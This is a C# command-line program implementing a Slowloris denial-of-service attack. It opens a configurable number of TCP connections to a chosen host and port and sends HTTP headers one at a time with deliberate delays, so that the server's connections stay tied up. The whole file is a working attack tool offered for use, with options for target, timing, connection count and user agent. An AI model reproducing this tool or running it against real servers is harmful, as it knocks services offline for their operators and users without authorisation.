using System.Net.Sockets;
using System.Text;
using ConsoleAppFramework;
using Microsoft.Extensions.Logging;

var app = ConsoleApp
    .CreateBuilder(args)
    .Build();

await app.AddCommands<SlowLoris>().RunAsync();

public class SlowLoris : ConsoleAppBase {

    public async Task Attack(
        [Option("h", "Host that is the target")] string host,
        [Option("p", "Port")] uint port,
        [Option("w", "Seconds to wait between sending headers")] uint secondsToWait = 3,
        [Option("r", "Seconds to wait until response timesout")] uint timeout = 2,
        [Option("c", "Number of connections to spawn")] uint connections = 10,
        [Option("u", "User Agent string to use as header")] string userAgent = "curl/7.68.0"
    ) {
        var logger = this.Context.Logger;
        var waitTime = TimeSpan.FromSeconds(secondsToWait);
        var responseTimeout = TimeSpan.FromSeconds(timeout);
        var headers = new List<string> {
            "GET / HTTP/1.1\n",
            $"Host: {host}\n",
            $"User-Agent: {userAgent}\n",
            "Accept: */*\n",
            "Connection: close\n",
            "\n"
        };

        logger.LogInformation("Setting up {Connections} attack(s) against {Host}:{Port}", connections, host, port);
        Console.WriteLine($"Setting up {connections} attacks against {host}:{port}");
        var attackTasks = new Task<string>[connections];
        for (uint i = 0; i < connections; i++) {
            attackTasks[i] = StartAttackAsync(i + 1, host, (int)port, headers, waitTime, responseTimeout,
            logger, this.Context.CancellationToken);
        }

        var results = await Task.WhenAll(attackTasks);
        var errorResults = results.Where(r => r.StartsWith("ERROR")).ToList();
        logger.LogInformation("Finished with {Errors} errors out of {Attacks} attacks run", errorResults.Count, attackTasks.Length);
        Console.WriteLine($"Finished with {errorResults.Count} errors out of {attackTasks.Length} attack(s) run");
        errorResults.ForEach(Console.WriteLine);
    }

    private async Task<string> StartAttackAsync(
        uint id,
        string target,
        int port,
        List<string> headers,
        TimeSpan waitToSendNextHeader,
        TimeSpan responseTimeout,
        ILogger logger,
        CancellationToken cancellationToken)
    {
        try
        {
            logger.LogInformation("Attack {AttackId} - Opening TCP Connection", id);
            using var client = new TcpClient(target, port);
            client.ReceiveTimeout = responseTimeout.Milliseconds;
            using var request = client.GetStream();

            logger.LogInformation("Attack {AttackId} - Sending HTTP Headers", id);
            foreach (var header in headers)
            {
                if (request.CanWrite == false)
                {
                    logger.LogError("Attack {AttackId} - Can't write to stream", id);
                    break;
                }
                logger.LogInformation("Attack {AttackId} - Sending Header {Header}", id, header);
                var content = Encoding.ASCII.GetBytes(header);
                await request.WriteAsync(content, 0, content.Length, cancellationToken);
                await Task.Delay(waitToSendNextHeader, cancellationToken);
            }

            using var response = client.GetStream();
            var body = new List<int>();
            var resByte = response.ReadByte();
            logger.LogInformation("Attack {AttackId} - Receiving HTTP Response", id);

            while (resByte != -1)
            {
                body.Add(resByte);
                resByte = response.ReadByte();
            }
            byte[] result = new byte[body.Count * sizeof(int)];
            Buffer.BlockCopy(body.ToArray(), 0, result, 0, result.Length);
            logger.LogInformation("Attack {AttackId} - Closing TCP Connection", id);
            request.Close();
            response.Close();
            client.Close();

            logger.LogInformation("Attack {AttackId} - Successful Attack", id);
            return Encoding.ASCII.GetString(result);
        }
        catch (SocketException socketEx)
        {
            logger.LogError("Attack {AttackId} - Socket Exception Thrown - {Message}", id, socketEx.Message);

            return $"ERROR - Socket Exception: {socketEx.Message}";
        }
        catch (TaskCanceledException) {
            logger.LogError("Attack {AttackId} - Task was cancelled before finishing", id);
            return $"ERROR - Task was cancelled before finishing.";
        }
        catch (Exception ex)
        {
            logger.LogError("Attack {AttackId} - Exception Thrown - {Message}", id, ex.Message);
            return $"ERROR - Exception During Attack: {ex.Message}";
        }
    }
}
